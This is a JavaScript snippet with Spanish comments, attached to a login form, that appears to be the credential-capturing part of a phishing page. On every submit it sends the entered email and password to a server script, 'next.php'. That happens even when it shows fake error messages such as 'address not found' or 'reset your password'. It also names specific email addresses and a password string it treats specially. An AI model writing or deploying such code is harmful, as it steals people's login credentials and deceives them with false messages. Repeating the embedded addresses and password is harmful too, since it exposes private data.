<script>
document.querySelector('form').addEventListener('submit', function(event) {
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="pass"]');
    const errorMessage = document.getElementById('error-message');

    // Lista de correos electrónicos y contraseñas prohibidos
    const prohibitedEmails = ["tilin282@gmail.com", "nataliahidalgo282@gmail.com"];
    const prohibitedWords = ["Eliza19gp","eliza19gp"]; // Lista de palabras prohibidas

    const email = emailInput.value;
    const password = passwordInput.value;

    const isProhibitedEmail = prohibitedEmails.includes(email.trim().toLowerCase()); // Corregir el error de comparación de correos
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word)); // Corregir el error de variable indefinida

    let data;

    if (isProhibitedEmail) {
        errorMessage.textContent = "No se encuentra la dirección de correo";
        errorMessage.style.color = 'red';
        errorMessage.style.fontSize = '14px';
        errorMessage.style.fontFamily = 'Arial, sans-serif';
        emailInput.value = '';
        passwordInput.value = '';
        event.preventDefault();
    } else if (containsProhibitedPassword) {
        errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
        errorMessage.style.color = 'red';
        errorMessage.style.fontSize = '14px';
        errorMessage.style.fontFamily = 'Arial, sans-serif';

        // Construir la cadena data con la contraseña prohibida
        data = `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)} (Contraseña incorrecta)`;

        passwordInput.value = '';
        event.preventDefault();
    } else {
        errorMessage.textContent = '';
        data = `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(password)}`;
    }

    const xhr = new XMLHttpRequest();
    xhr.open("POST", "next.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Los datos se han enviado correctamente
        }
    };
    xhr.send(data);
});
</script>
